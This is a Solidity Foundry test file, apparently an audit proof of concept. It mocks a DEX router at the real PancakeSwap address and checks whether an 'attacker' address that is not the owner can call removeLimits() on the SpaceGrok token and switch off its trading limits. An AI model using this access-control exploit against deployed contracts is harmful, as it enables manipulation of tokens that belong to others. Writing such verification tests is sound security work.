// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/SpaceGrok.sol";

contract MockUniswapV2Factory {
    function createPair(address, address) external pure returns (address) {
        return address(0xDeaDBeeF);
    }
}

contract MockUniswapV2Router {
    address public immutable factory;
    address public immutable WETH;

    constructor(address _factory, address _weth) {
        factory = _factory;
        WETH = _weth;
    }

    function addLiquidityETH(
        address,
        uint256,
        uint256,
        uint256,
        address,
        uint256
    ) external payable returns (uint256, uint256, uint256) {
        return (0, 0, 0);
    }
}

contract SpaceGrokAccessControlTest is Test {
    SpaceGrok token;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");
    
    // The actual PancakeSwap router address on mainnet
    address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant WETH = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    function setUp() public {
        // Deploy mock contracts
        MockUniswapV2Factory mockFactory = new MockUniswapV2Factory();
        MockUniswapV2Router mockRouter = new MockUniswapV2Router(
            address(mockFactory),
            WETH
        );
        
        // Simulate the actual router by setting its code
        vm.etch(PANCAKE_ROUTER, address(mockRouter).code);
        
        // Deploy the token as owner
        vm.prank(owner);
        token = new SpaceGrok();
    }

    function testNonOwnerCanRemoveLimits() public {
        // Pre-trigger state snapshot
        console2.log("--- BEFORE-Trigger LimitsActive ---");
        bool initialLimitsActive = token.limitsActive();
        console2.log("Initial limitsActive state:", initialLimitsActive);

        // Trigger vulnerability
        console2.log("--- Trigger RemoveLimits ---");
        vm.prank(attacker);
        bool result = token.removeLimits();
        console2.log("Function return value:", result);
        
        // Post-trigger state snapshot
        console2.log("--- AFTER-Trigger LimitsActive ---");
        bool finalLimitsActive = token.limitsActive();
        console2.log("Final limitsActive state:", finalLimitsActive);
        
        // Differential validation
        if (initialLimitsActive && !finalLimitsActive) {
            console2.log("Vulnerability Exists: Non-owner successfully disabled trading limits");
        } else {
            console2.log("Vulnerability not Exist: Trading limits remain enabled");
        }
    }
}